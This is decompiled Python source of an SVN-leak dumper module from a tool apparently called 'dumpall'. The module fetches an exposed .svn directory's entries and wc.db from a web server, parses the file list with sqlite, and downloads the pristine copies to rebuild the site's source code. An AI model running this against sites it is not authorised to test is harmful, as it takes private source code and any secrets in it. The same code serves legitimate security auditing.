# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build/bdist.macosx-10.14-x86_64/egg/dumpall/addons/svndumper.py
# Compiled at: 2019-10-24 09:19:23
# Size of source mod 2**32: 2248 bytes
"""
SVN源代码泄露利用工具
"""
import re, sqlite3, click
from aiomultiprocess import Pool
from ..dumper import BasicDumper

class Dumper(BasicDumper):
    __doc__ = ' .svn Dumper '

    def __init__(self, url, outdir):
        super(Dumper, self).__init__(url, outdir)
        self.base_url = re.sub('.svn.*', '.svn', url)

    async def start(self):
        """ dumper入口方法 """
        entries_url = self.base_url + '/entries'
        status, data = await self.fetch(entries_url)
        if not data:
            click.secho(('Failed [%s] %s' % (status, entries_url)), fg='red')
            return
        if data == b'12\n':
            await self.dump()
        else:
            click.secho('DUMP LEGACY', fg='yellow')
            await self.dump_legacy()

    async def dump(self):
        """ 针对svn1.7以后的版本 """
        idxfile = await self.indexfile(self.base_url + '/wc.db')
        for item in self.parse(idxfile.name):
            sha1, filename = item
            if sha1:
                if not filename:
                    continue
                url = '%s/pristine/%s/%s.svn-base' % (self.base_url, sha1[6:8], sha1[6:])
                self.targets.append((url, filename))

        idxfile.close()
        async with Pool() as pool:
            await pool.map(self.download, self.targets)

    async def dump_legacy(self):
        """ 针对svn1.7以前的版本 """
        pass

    def parse(self, filename: str) -> list:
        """ sqlite解析wc.db并返回一个(hash, name)组成列表 """
        try:
            conn = sqlite3.connect(filename)
            cursor = conn.cursor()
            cursor.execute('select checksum, local_relpath from NODES')
            items = cursor.fetchall()
            conn.close()
            return items
        except Exception as e:
            try:
                click.secho('Sqlite connection failed.', fg='red')
                click.secho((str(e.args)), fg='red')
                return []
            finally:
                e = None
                del e